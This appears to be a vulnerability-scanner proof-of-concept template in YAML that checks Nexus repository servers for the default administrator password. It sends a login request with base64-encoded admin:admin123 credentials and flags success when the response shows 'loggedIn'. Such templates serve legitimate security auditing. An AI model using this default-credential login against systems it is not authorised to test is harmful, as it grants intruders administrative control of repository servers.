id: poc-yaml-nexus-default-password
info:
  name: Nexus 默认密码漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Nexus
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /service/local/authentication/login
  headers:
    Accept: application/json
    Authorization: Basic YWRtaW46YWRtaW4xMjM=
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "json") && contains(body, "loggedIn")
  output: []
